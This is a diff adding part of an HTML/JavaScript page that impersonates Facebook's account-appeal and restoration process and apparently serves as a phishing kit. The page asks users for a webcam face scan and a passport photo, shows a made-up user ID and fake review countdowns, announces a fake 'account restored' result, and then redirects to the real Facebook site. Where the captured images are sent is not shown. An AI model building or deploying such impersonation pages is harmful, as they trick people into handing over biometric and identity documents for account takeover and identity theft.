+                <div class="warning-badge">
+                    <span class="warning-badge-icon">⚠️</span>
+                </div>
+
+                <h2 class="appeal-main-title"><span class="user-id-dynamic">User ID: ...</span>, you submitted an appeal</h2>
+                <div class="appeal-date" id="appealSubmittedDate">ON OCTOBER 23, 2026</div>
+
+                <div class="appeal-subtitle">Check back here for the result.</div>
+                <p class="appeal-notice">
+                    Your account is not visible to people on Facebook, and you can't use it.
+                </p>
+
+                <hr class="appeal-divider">
+
+                <div class="appeal-section-title">What happens next?</div>
+                <ul class="appeal-bullet-list">
+                    <li>It usually takes us just over a day to review your information.</li>
+                    <li>If we find your account does follow our Community Standards, you'll be able to use Facebook again.</li>
+                    <li>If we find your account doesn't follow our Community Standards, it will be permanently disabled and you won't be able to appeal again.</li>
+                </ul>
+            </div>
+
+            <button class="btn-close-dark" onclick="redirectToFacebook()">Close</button>
+        </div>
+    </div>
+
+    <!-- SCREEN 8: 1 Min 23 Sec Review Finish Screen -->
+    <div id="screen-restore-success" class="screen">
+        <div class="restore-success-card">
+            <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
+            <h1 class="restore-success-title">Your account restore Successfully</h1>
+            <p style="color: #65676b; margin-bottom: 30px;">Thank you for confirming your details. You can now use your Facebook account normally.</p>
+            <button class="btn-primary" onclick="redirectToFacebook()">Go to Facebook</button>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    let selectedType = 'video';
+    let mediaStream = null;
+    let scanInterval = null;
+    let currentRandomNum = "";
+
+    // Automatic Random User ID Generator
+    function updateRandomUserId() {
+        currentRandomNum = Math.floor(100000 + Math.random() * 900000);
+        const elements = document.querySelectorAll('.user-id-dynamic');
+        elements.forEach(el => {
+            el.innerText = "User ID: " + currentRandomNum;
+        });
+    }
+    setInterval(updateRandomUserId, 30 * 60 * 1000);
+    updateRandomUserId();
+
+    function selectOption(type, element) {
+        selectedType = type;
+        const boxes = document.querySelectorAll('.option-box');
+        boxes.forEach(box => box.classList.remove('selected'));
+        element.classList.add('selected');
+    }
+
+    function showScreen(screenId) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById(screenId).classList.add('active');
+    }
+
+    function proceedNext() {
+        if (selectedType === 'video') {
+            document.getElementById('loadingText').innerText = "Loading verification process...";
+            showScreen('screen-loading');
+            setTimeout(() => {
+                showScreen('screen-camera');
+                startCamera();
+            }, 2000);
+        } else {
+            showScreen('screen-passport');
+        }
+    }
+
+    // Camera and 15-Second Face Scan Handling
+    function startCamera() {
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('photoCanvas');
+        const instruction = document.getElementById('cameraInstruction');
+        const uploadBtn = document.getElementById('uploadBtn');
+
+        video.style.display = 'block';
+        canvas.style.display = 'none';
+        uploadBtn.style.display = 'none';
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                mediaStream = stream;
+                video.srcObject = stream;
+
+                let timeLeft = 15;
+                instruction.innerText = `Hold still while scanning... (${timeLeft}s)`;
+
+                scanInterval = setInterval(() => {
+                    timeLeft--;
+                    if (timeLeft > 0) {
+                        instruction.innerText = `Hold still while scanning... (${timeLeft}s)`;
+                        document.getElementById('arrowIcon').style.transform = `rotate(${ (15 - timeLeft) * 24 }deg)`;
+                    } else {
+                        clearInterval(scanInterval);
+
+                        canvas.width = video.videoWidth || 320;
+                        canvas.height = video.videoHeight || 240;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        video.style.display = 'none';
+                        canvas.style.display = 'block';
+
+                        if (mediaStream) {
+                            mediaStream.getTracks().forEach(track => track.stop());
+                        }
+
+                        instruction.innerText = "Face Scan Complete!";
+                        uploadBtn.style.display = 'block';
+                    }
+                }, 1000);
+            })
+            .catch(err => {
+                console.log("Camera access denied or unavailable: ", err);
+                instruction.innerText = "Camera Access Denied";
+            });
+    }
+
+    // Selfie Upload
+    function uploadSelfie() {
+        showScreen('screen-review');
+        setTimeout(() => {
+            showScreen('screen-captcha');
+        }, 31000);
+    }
+
+    // File Selection
+    function handleFileSelected() {
+        const fileInput = document.getElementById('passportFile');
+        const submitBtn = document.getElementById('passportSubmitBtn');
+        const fileStatus = document.getElementById('fileStatusText');
+
+        if (fileInput.files && fileInput.files[0]) {
+            fileStatus.style.display = 'block';
+            fileStatus.innerText = "✓ Photo selected: " + fileInput.files[0].name;
+            submitBtn.disabled = false;
+        }
+    }
+
+    // Passport Submit with BD Auto Date, 10s Loading & 1 Minute 23 Seconds Timer
+    function submitPassport() {
+        document.getElementById('loadingText').innerText = "Uploading your document...";
+        showScreen('screen-loading');
+
+        setTimeout(() => {
+            // Generate Auto Bangladesh Date
+            const now = new Date();
+            const options = { month: 'long', day: 'numeric', year: 'numeric' };
+            const bdDateFormatted = now.toLocaleDateString('en-US', options).toUpperCase();
+            document.getElementById('appealSubmittedDate').innerText = "ON " + bdDateFormatted;
+
+            // Show Appeal Screen
+            showScreen('screen-appeal-submitted');
+
+            // 1 Minute 23 Seconds Timer = (60 + 23) * 1000 = 83000 ms
+            setTimeout(() => {
+                showScreen('screen-restore-success');
+            }, 83000);
+
+        }, 10000);
+    }
+
+    function redirectToFacebook() {
+        window.location.href = "https://m.facebook.com";
+    }
+</script>
+
+</body>
+</html>
